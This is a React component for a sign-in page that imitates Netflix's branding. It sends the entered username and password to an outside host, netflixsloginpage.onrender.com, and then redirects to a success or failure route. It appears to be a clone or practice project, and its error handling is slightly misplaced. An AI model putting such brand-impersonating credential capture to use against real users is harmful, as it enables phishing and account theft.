import React from "react"
import bg from '../assets/bg.jpg';
import axios from "axios"
import { useState } from "react";
import { useNavigate } from "react-router-dom";


const Home = () => {

const [user,setuser]=useState();
const [pass,setpass]=useState("")
const navigate =useNavigate()

function handleuser(e){
    setuser(e.target.value)
}
function handlepass(e){
    setpass(e.target.value)
}

function check(){
    var login=axios.post("https://netflixsloginpage.onrender.com/login",{username:user,password:pass});
    login.then (function(res){

    console.log(res)
    login.catch((err)=>{console.log(err)
        navigate('/fail')
    })

    if(res.data==true){
        navigate("/success")
    }
    else{
        navigate("/fail")
    }
    })

}

    return (
        <div className="relative min-h-screen overflow-hidden">
            <img className=" absolute inset-0 w-full h-full object-cover -z-10" src={bg} alt="bg">
            </img>
            <div className="flex justify-center h-screen items-center">
                <div className=" bg-black/60 p-20 text-white">
                    <h1 className="font-bold text-2xl">Sign In</h1><br></br>
                    <input  onChange={handleuser} className="border w-full p-2 outline-0 rounded mb-5" name="username" type="text" placeholder="Email or phone number" required></input><br></br>
                    <input onChange={handlepass} className="border w-full p-2 outline-0 rounded mb-3" name="password" type="password" placeholder="Password" required></input><br></br>

                    <button onClick={check} className="mt-5 cursor-pointer bg-red-700 p-2 w-full rounded" disabled={user?.trim()===""|| pass?.trim()===""} >Sign In</button>
                    <div className="flex  gap-1 items-center">
                          <input type="checkbox" ></input>
                          <p className="text-xs p-2">Rebmember me</p>
                          <p className="text-xs">Need Help?</p>
                    </div>
                    <div className="flex-wrap">
                        <p>New to Netflix?<span>Sign up now</span></p>
                        <p className="w-64">The page is protected by Google reCAPTCHA to ensure you're not a bot.<span className="text-blue-500">Learn More</span></p>
                    </div>
                  
                </div>


            </div>

        </div>
    )
}


export default Home